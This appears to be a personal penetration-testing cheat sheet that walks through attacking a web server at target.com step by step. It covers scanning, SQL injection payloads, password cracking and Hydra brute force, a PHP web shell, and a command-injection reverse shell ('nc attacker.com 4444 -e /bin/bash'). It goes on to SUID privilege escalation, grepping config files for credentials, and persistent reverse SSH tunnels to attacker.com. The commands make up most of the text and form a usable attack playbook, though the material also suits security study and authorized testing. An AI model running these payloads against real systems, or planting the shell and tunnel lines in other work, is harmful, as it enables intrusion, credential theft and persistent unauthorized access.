# All Concepts

Propietario: Adrian Gisbert Cabello

### 1. Public Network Enumeration

1. **DNS Enumeration**:
    - `nslookup target.com`
    - `dig target.com any`
    - `host -l target.com dns-server`
2. **Port Scanning**:
    - Using Nmap:
        
        ```bash
        nmap -sS -p- -T4 target.com
        nmap -sV -sC -O -A target.com
        ```
        
    - Using Masscan:
        
        ```bash
        masscan -p1-65535 target.com --rate=1000
        ```
        
3. **Service Enumeration**:
    - Banner Grabbing:
        
        ```bash
        nc target.com 80
        HEAD / HTTP/1.1
        ```
        

### 2. Targeting the Web Application

### 2.1 Web Application Enumeration

1. **Inspecting URLs**:
    - Use browser developer tools to view source code, URLs, and scripts.
    - `wget -r -l 2 -P recon/ https://target.com/`
2. **Inspecting Page Content**:
    - Look for comments, hidden fields, and unusual inputs in HTML source.
3. **Viewing Response Headers**:
    - Use tools like `curl` or `Burp Suite` to inspect HTTP response headers.
        
        ```bash
        curl -I https://target.com
        ```
        
4. **Inspecting Sitemaps**:
    - Look for `sitemap.xml` in the root directory of the website.
        
        ```bash
        wget https://target.com/sitemap.xml
        ```
        
5. **Locating Administration Consoles**:
    - Check common admin paths: `/admin`, `/administrator`, `/login`, etc.

### 2.2 SQL Injection Exploitation

1. **Manual SQL Injection**:
    - Test inputs with `' OR 1=1--`.
    - Use UNION SELECT to extract data.
    
    ```sql
    ' UNION SELECT 1, username, password FROM users--
    ```
    
2. **Automated Tools**:
    - Use `sqlmap` for automated SQL injection testing.
        
        ```bash
        sqlmap -u "https://target.com/page?id=1" --dbs
        ```
        

### 2.3 Cracking the Password

1. **Hash Extraction and Cracking**:
    - Extract hashes from the database.
    - Use tools like `John the Ripper` or `Hashcat` to crack passwords.
        
        ```bash
        john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
        ```
        

### 2.4 Enumerating the Admin Interface

1. **Brute Force Login**:
    - Use tools like `Hydra` to brute force admin login.
        
        ```bash
        hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
        ```
        

### 2.5 Obtaining a Shell

1. **File Upload Vulnerabilities**:
    - Upload a web shell through file upload functionality.
        
        ```php
        <?php system($_GET['cmd']); ?>
        ```
        
2. **Command Injection**:
    - Test for command injection vulnerabilities.
        
        ```bash
        ; nc attacker.com 4444 -e /bin/bash
        ```
        

### 2.6 Post-Exploitation Enumeration

1. **System Information**:
    - Gather information about the target system.
        
        ```bash
        uname -a
        whoami
        ```
        
2. **Network Information**:
    - Enumerate network interfaces and connections.
        
        ```bash
        ifconfig
        netstat -an
        ```
        

### 2.7 Creating a Stable Pivot Point

1. **Reverse SSH Tunnel**:
    - Use SSH to create a reverse tunnel for pivoting.
        
        ```bash
        ssh -R 9000:localhost:22 user@attacker.com
        ```
        

### 3. Targeting the Database

### 3.1 Enumeration

1. **Database Information**:
    - Enumerate databases and tables using SQL commands.
    
    ```sql
    SELECT schema_name FROM information_schema.schemata;
    ```
    
2. **Identifying DB Users**:
    - Extract database user information.
    
    ```sql
    SELECT user, host FROM mysql.user;
    ```
    

### 3.2 Attempting to Exploit the Database

1. **SQL Injection**:
    - Use SQL injection to manipulate the database.
2. **Privilege Escalation**:
    - Escalate privileges within the database.
    
    ```sql
    GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost';
    ```
    

### 4. Deeper Enumeration of the Web Application Server

### 4.1 More Thorough Post Exploitation

1. **File System Enumeration**:
    - Search for sensitive files and directories.
        
        ```bash
        find / -type f -name "*.conf"
        ```
        

### 4.2 Privilege Escalation

1. **SUID Binaries**:
    - Find and exploit SUID binaries.
        
        ```bash
        find / -perm -4000 -type f 2>/dev/null
        ```
        

### 4.3 Searching for DB Credentials

1. **Configuration Files**:
    - Search for database credentials in configuration files.
        
        ```bash
        grep -i 'password' /var/www/html/config.php
        ```
        

### 5. Creating a Stable Reverse Tunnel

### 5.1 Exploitation

1. **Reverse SSH Tunnel**:
    - Create a persistent reverse tunnel.
        
        ```bash
        autossh -M 0 -N -f -R 9000:localhost:22 user@attacker.com
        ```
        

### 6. Final Steps

### 6.1 Reporting

1. **Document Findings**:
    - Prepare detailed reports of all findings and exploits used.
2. **Mitigation Recommendations**:
    - Provide recommendations for mitigating the vulnerabilities found.